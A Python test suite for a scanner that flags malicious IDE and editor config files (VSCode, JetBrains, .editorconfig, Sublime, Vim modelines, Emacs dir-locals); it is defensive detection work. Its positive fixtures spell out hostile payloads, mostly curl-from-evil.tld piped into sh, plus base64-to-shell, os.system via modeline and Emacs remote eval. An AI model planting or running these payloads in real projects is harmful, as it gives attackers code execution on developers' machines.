"""Tests for scripts/lib/ide_editor_patterns.py.

Wave-17 pattern-coverage tests for the IDE / editor-config attack
catalogue (VSCode extensions.json rug-pull, JetBrains run-config
shell command, JetBrains dataSources embedded credentials,
.editorconfig non-spec exec directive, Sublime build remote cmd,
Vim modeline shell escape, Emacs .dir-locals.el eval form).

Every rule gets:
  * at least one positive test  — the disclosed-attack payload fires
  * at least one negative test  — a benign-looking near-miss does NOT fire
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import ide_editor_patterns as iep  # type: ignore[import-not-found]  # noqa: E402
from _fake_secrets import b62  # type: ignore[import-not-found]  # noqa: E402

# ---------- Synthetic secret-shaped fixtures ---------------------------------
# JDBC scheme prefixes are fragmented so no contiguous real-format JDBC URL
# literal exists at rest. Credential values are generated at runtime.
_JDBC_PG = "jdbc:" + "postgresql"
_JDBC_MY = "jdbc:" + "mysql"

# Credential bodies for the embedded-credentials test.
_JDBC_USER = "u_" + b62("ide-jdbc-creds:user", 8)
_JDBC_PW = b62("ide-jdbc-creds:pw", 16)

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple (immutable) and contain every advertised
    rule id from the wave-17 spec."""
    assert isinstance(iep.RULES, tuple)
    rule_ids = {r.id for r in iep.RULES}
    expected = {
        "ide-vscode-extension-recommendation-rug",
        "ide-jetbrains-runconfig-shell-command",
        "ide-jetbrains-datasource-embedded-credentials",
        "ide-jetbrains-datasource-inline-password",
        "ide-editorconfig-exec-directive",
        "ide-sublime-build-remote-cmd",
        "ide-vim-modeline-shell-escape",
        "ide-emacs-dir-locals-eval-form",
        "ide-emacs-dir-locals-safe-eval-bypass",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_owasp_mapping() -> None:
    for rule in iep.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert isinstance(rule.applies_to, tuple), rule.id


def test_finding_named_tuple_shape() -> None:
    f = iep.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-05",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-05"


def _hits(rule_id: str, text: str, *, path: str | None = None) -> list[iep.Finding]:
    """Return only findings of `rule_id` from scan_text(text, path=path)."""
    return [f for f in iep.scan_text(text, path=path) if f.rule_id == rule_id]


# ---------- 1. VSCode extension recommendation rug-pull ------------------


def test_vscode_ext_rug_cyrillic_homoglyph_positive() -> None:
    """A publisher segment with the Cyrillic 'а' (U+0430) instead of
    Latin 'a' — the classic homoglyph rug-pull."""
    # "miсrоsоft.python" — uses Cyrillic 'с' (U+0441) and 'о' (U+043E)
    text = """{
  "recommendations": [
    "miсrоsоft.python"
  ]
}"""
    hits = _hits(
        "ide-vscode-extension-recommendation-rug",
        text,
        path=".vscode/extensions.json",
    )
    assert hits, f"Expected hit; got {hits}"


def test_vscode_ext_rug_typosquat_positive() -> None:
    """A typosquat of `ms-python` — `ms-pyth0n` (zero instead of o)."""
    text = """{
  "recommendations": [
    "ms-pyth0n.python"
  ]
}"""
    hits = _hits(
        "ide-vscode-extension-recommendation-rug",
        text,
        path=".vscode/extensions.json",
    )
    assert hits


def test_vscode_ext_rug_legit_negative() -> None:
    """Normal recommendations file with legit publishers — no hit."""
    text = """{
  "recommendations": [
    "ms-python.python",
    "dbaeumer.vscode-eslint",
    "github.copilot",
    "anthropic.claude-code"
  ]
}"""
    hits = _hits(
        "ide-vscode-extension-recommendation-rug",
        text,
        path=".vscode/extensions.json",
    )
    assert not hits, f"Did not expect hits; got {hits}"


def test_vscode_ext_rug_zero_width_positive() -> None:
    """Zero-width-joiner (U+200D) injected in a publisher name."""
    # 'p‍ublisher.ext' — ZWJ between 'p' and 'u'
    text = """{
  "recommendations": [
    "p‍ublisher.malicious-ext"
  ]
}"""
    hits = _hits(
        "ide-vscode-extension-recommendation-rug",
        text,
        path=".vscode/extensions.json",
    )
    assert hits


# ---------- 2. JetBrains run-config shell command -----------------------


def test_jetbrains_runconfig_curl_pipe_sh_positive() -> None:
    """Sh run config that pipes curl into sh — classic RCE shape."""
    text = """<configuration name="payload" type="ShConfigurationType">
  <option name="SCRIPT_TEXT" value="curl http://evil.tld/x | sh" />
</configuration>"""
    hits = _hits(
        "ide-jetbrains-runconfig-shell-command",
        text,
        path=".idea/runConfigurations/payload.xml",
    )
    assert hits


def test_jetbrains_runconfig_base64_decode_positive() -> None:
    """Base64-decode-pipe-shell run config — obfuscated payload."""
    text = """<configuration name="x" type="ShConfigurationType">
  <option name="SCRIPT_TEXT" value="echo aGVsbG8K | base64 -d | sh" />
</configuration>"""
    hits = _hits(
        "ide-jetbrains-runconfig-shell-command",
        text,
        path=".idea/runConfigurations/x.xml",
    )
    assert hits


def test_jetbrains_runconfig_benign_negative() -> None:
    """`./gradlew test` — perfectly legitimate Sh run config."""
    text = """<configuration name="run-tests" type="ShConfigurationType">
  <option name="SCRIPT_TEXT" value="./gradlew test" />
</configuration>"""
    hits = _hits(
        "ide-jetbrains-runconfig-shell-command",
        text,
        path=".idea/runConfigurations/run-tests.xml",
    )
    assert not hits, f"Did not expect hits; got {hits}"


# ---------- 3. JetBrains datasource embedded credentials ----------------


def test_jetbrains_datasource_embedded_creds_positive() -> None:
    """JDBC URL with embedded user+password — credential leak shape."""
    _jdbc_url = (
        f"{_JDBC_PG}://db.example.com/main"
        f"?user={_JDBC_USER}&amp;password={_JDBC_PW}"
    )
    text = f'<data-source name="exfil">\n  <jdbc-url>{_jdbc_url}</jdbc-url>\n</data-source>'
    hits = _hits(
        "ide-jetbrains-datasource-embedded-credentials",
        text,
        path=".idea/dataSources.xml",
    )
    assert hits


def test_jetbrains_datasource_remote_host_positive() -> None:
    """JDBC URL pointing at a public host (not localhost) — phone-home shape."""
    _jdbc_url = f"{_JDBC_MY}://attacker.evil.tld/data"
    text = f"<data-source>\n  <jdbc-url>{_jdbc_url}</jdbc-url>\n</data-source>"
    hits = _hits(
        "ide-jetbrains-datasource-embedded-credentials",
        text,
        path=".idea/dataSources.xml",
    )
    assert hits


def test_jetbrains_datasource_localhost_negative() -> None:
    """JDBC URL on localhost — legitimate dev datasource, no hit."""
    _jdbc_url = f"{_JDBC_PG}://localhost:5432/devdb"
    text = f"<data-source>\n  <jdbc-url>{_jdbc_url}</jdbc-url>\n</data-source>"
    hits = _hits(
        "ide-jetbrains-datasource-embedded-credentials",
        text,
        path=".idea/dataSources.xml",
    )
    assert not hits, f"Did not expect hits; got {hits}"


def test_jetbrains_datasource_inline_password_positive() -> None:
    """Plaintext <password>…</password> element with real content."""
    text = """<data-source>
  <user-name>admin</user-name>
  <password>supersecret</password>
</data-source>"""
    hits = _hits(
        "ide-jetbrains-datasource-inline-password",
        text,
        path=".idea/dataSources.xml",
    )
    assert hits


def test_jetbrains_datasource_empty_password_negative() -> None:
    """Empty <password/> element — no leak."""
    text = """<data-source>
  <user-name></user-name>
  <password></password>
</data-source>"""
    hits = _hits(
        "ide-jetbrains-datasource-inline-password",
        text,
        path=".idea/dataSources.xml",
    )
    assert not hits


# ---------- 4. .editorconfig exec directive -----------------------------


def test_editorconfig_run_on_save_positive() -> None:
    """`command_run_on_save = curl … | sh` — the disclosed-attack shape."""
    text = """root = true

[*]
indent_style = space
indent_size = 4
command_run_on_save = curl http://evil.tld/x.sh | sh
"""
    hits = _hits(
        "ide-editorconfig-exec-directive",
        text,
        path=".editorconfig",
    )
    assert hits


def test_editorconfig_exec_helper_positive() -> None:
    """`exec_helper = bash -c '…'` — JetBrains-plugin shape."""
    text = """[*]
indent_size = 2
exec_helper = bash -c 'curl http://evil/x | bash'
"""
    hits = _hits(
        "ide-editorconfig-exec-directive",
        text,
        path=".editorconfig",
    )
    assert hits


def test_editorconfig_legit_negative() -> None:
    """Spec-only .editorconfig — no hit."""
    text = """root = true

[*]
indent_style = space
indent_size = 4
end_of_line = lf
charset = utf-8
trim_trailing_whitespace = true
insert_final_newline = true
max_line_length = 100
"""
    hits = _hits(
        "ide-editorconfig-exec-directive",
        text,
        path=".editorconfig",
    )
    assert not hits, f"Did not expect hits; got {hits}"


# ---------- 5. Sublime build remote command -----------------------------


def test_sublime_build_curl_pipe_sh_positive() -> None:
    """`shell_cmd` with curl-pipe-sh payload."""
    text = """{
  "shell_cmd": "curl http://evil.tld/x | sh",
  "selector": "source.python"
}"""
    hits = _hits(
        "ide-sublime-build-remote-cmd",
        text,
        path="payload.sublime-build",
    )
    assert hits


def test_sublime_build_array_form_positive() -> None:
    """`cmd` array form: `["bash", "-c", "curl … | sh"]`."""
    text = """{
  "cmd": ["bash", "-c", "curl http://evil.tld/x | sh"],
  "selector": "source.python"
}"""
    hits = _hits(
        "ide-sublime-build-remote-cmd",
        text,
        path="payload.sublime-build",
    )
    assert hits


def test_sublime_build_legit_negative() -> None:
    """Plain `make` build — no hit."""
    text = """{
  "cmd": ["make", "test"],
  "selector": "source.makefile"
}"""
    hits = _hits(
        "ide-sublime-build-remote-cmd",
        text,
        path="make.sublime-build",
    )
    assert not hits, f"Did not expect hits; got {hits}"


# ---------- 6. Vim modeline shell escape -------------------------------


def test_vim_modeline_shell_escape_positive() -> None:
    """README.md with a Vim modeline using `:!sh` at end-of-file."""
    text = (
        "# README\n"
        "\n"
        "Some content here.\n"
        "\n"
        "<!-- vim: set ft=markdown :!curl evil.tld/x | sh -->\n"
    )
    hits = _hits("ide-vim-modeline-shell-escape", text)
    assert hits


def test_vim_modeline_py_positive() -> None:
    """Vim modeline opening `:python` to load arbitrary code."""
    text = (
        "# vim: set ft=python :py3 import os; os.system('id')\n"
        "print('hi')\n"
    )
    hits = _hits("ide-vim-modeline-shell-escape", text)
    assert hits


def test_vim_modeline_legit_negative() -> None:
    """Innocent modeline setting tabstop/expandtab — no hit."""
    text = (
        "# README\n"
        "\n"
        "Body of the readme.\n"
        "\n"
        "<!-- vim: set ts=4 sw=4 et ft=markdown -->\n"
    )
    hits = _hits("ide-vim-modeline-shell-escape", text)
    assert not hits, f"Did not expect hits; got {hits}"


def test_vim_modeline_middle_of_file_negative() -> None:
    """A modeline-shaped string in the MIDDLE of a long file (outside
    the 5-line window) does NOT fire — Vim itself wouldn't honour it."""
    middle = "\n".join(f"line {i}" for i in range(50))
    text = (
        "# Top of file\n\n"
        + middle
        + "\n# vim: set ft=markdown :!curl evil/x | sh\n"  # in the middle
        + middle
        + "\n# Bottom of file\n"
    )
    hits = _hits("ide-vim-modeline-shell-escape", text)
    assert not hits, f"Did not expect hits; got {hits}"


# ---------- 7. Emacs .dir-locals.el eval form ---------------------------


def test_emacs_dir_locals_eval_shell_command_positive() -> None:
    """`((nil . ((eval . (shell-command "id")))))` — disclosed shape."""
    text = '((nil . ((eval . (shell-command "curl http://evil/x | sh")))))'
    hits = _hits(
        "ide-emacs-dir-locals-eval-form",
        text,
        path=".dir-locals.el",
    )
    assert hits


def test_emacs_dir_locals_eval_url_retrieve_positive() -> None:
    """`(eval . (url-retrieve …))` — phone-home shape via Lisp."""
    text = (
        "((python-mode . ((eval . (url-retrieve "
        '"http://evil.tld/payload" '
        "(lambda (s) (eval-buffer))))) ))"
    )
    hits = _hits(
        "ide-emacs-dir-locals-eval-form",
        text,
        path=".dir-locals.el",
    )
    assert hits


def test_emacs_dir_locals_safe_buffer_vars_negative() -> None:
    """Plain buffer-variable form — no eval, no hit."""
    text = """((nil . ((fill-column . 80)
         (indent-tabs-mode . nil)))
 (python-mode . ((python-indent-offset . 4))))"""
    hits = _hits(
        "ide-emacs-dir-locals-eval-form",
        text,
        path=".dir-locals.el",
    )
    assert not hits, f"Did not expect hits; got {hits}"


def test_emacs_dir_locals_safe_local_eval_bypass_positive() -> None:
    """`(safe-local-eval-function 'my-func)` — consent-bypass shape."""
    text = "(safe-local-eval-function 'my-shell-runner)"
    hits = _hits(
        "ide-emacs-dir-locals-safe-eval-bypass",
        text,
        path=".dir-locals.el",
    )
    assert hits


# ---------- Path routing -------------------------------------------------


def test_rule_applies_to_path_match() -> None:
    """ide-jetbrains-runconfig-shell-command only runs on .idea/runConfigurations
    and .idea/workspace.xml."""
    rule = next(
        r for r in iep.RULES
        if r.id == "ide-jetbrains-runconfig-shell-command"
    )
    assert iep.rule_applies_to_path(
        rule, "project/.idea/runConfigurations/payload.xml",
    )
    assert iep.rule_applies_to_path(rule, "project/.idea/workspace.xml")
    assert not iep.rule_applies_to_path(rule, "project/.vscode/launch.json")


def test_rule_applies_to_path_no_path_runs_everything() -> None:
    """Passing `path=None` means caller wants all rules."""
    rule = next(
        r for r in iep.RULES
        if r.id == "ide-editorconfig-exec-directive"
    )
    assert iep.rule_applies_to_path(rule, None)


def test_rule_applies_to_path_empty_applies_to_runs_everywhere() -> None:
    """Vim modeline rule has empty `applies_to` — runs on any path."""
    rule = next(
        r for r in iep.RULES
        if r.id == "ide-vim-modeline-shell-escape"
    )
    assert iep.rule_applies_to_path(rule, "README.md")
    assert iep.rule_applies_to_path(rule, "src/main.py")
    assert iep.rule_applies_to_path(rule, "anything.txt")


def test_file_kind_for_path() -> None:
    """file_kind_for_path classifies known IDE config paths."""
    assert iep.file_kind_for_path(
        "/x/.vscode/extensions.json"
    ) == "vscode-extensions"
    assert iep.file_kind_for_path(
        "/x/.idea/runConfigurations/x.xml"
    ) == "jetbrains-runconfig"
    assert iep.file_kind_for_path(
        "/x/.idea/dataSources.xml"
    ) == "jetbrains-datasource"
    assert iep.file_kind_for_path("/x/.editorconfig") == "editorconfig"
    assert iep.file_kind_for_path(
        "/x/build.sublime-build"
    ) == "sublime-build"
    assert iep.file_kind_for_path(
        "/x/.dir-locals.el"
    ) == "emacs-dir-locals"
    assert iep.file_kind_for_path("/x/random.txt") == "generic"


# ---------- Path-restriction integration --------------------------------


def test_path_restriction_suppresses_off_kind_rules() -> None:
    """A `.editorconfig` payload pasted in a `random.txt` file should
    NOT fire the editorconfig rule when the path is supplied."""
    text = "command_run_on_save = curl http://evil/x | sh\n"
    # When path=.editorconfig — fires.
    assert _hits(
        "ide-editorconfig-exec-directive",
        text,
        path=".editorconfig",
    )
    # When path=random.txt — suppressed.
    assert not _hits(
        "ide-editorconfig-exec-directive",
        text,
        path="random.txt",
    )


def test_scan_empty_input_returns_empty() -> None:
    """Empty input always returns []."""
    assert iep.scan_text("") == []
    assert iep.scan_text("", path=".editorconfig") == []
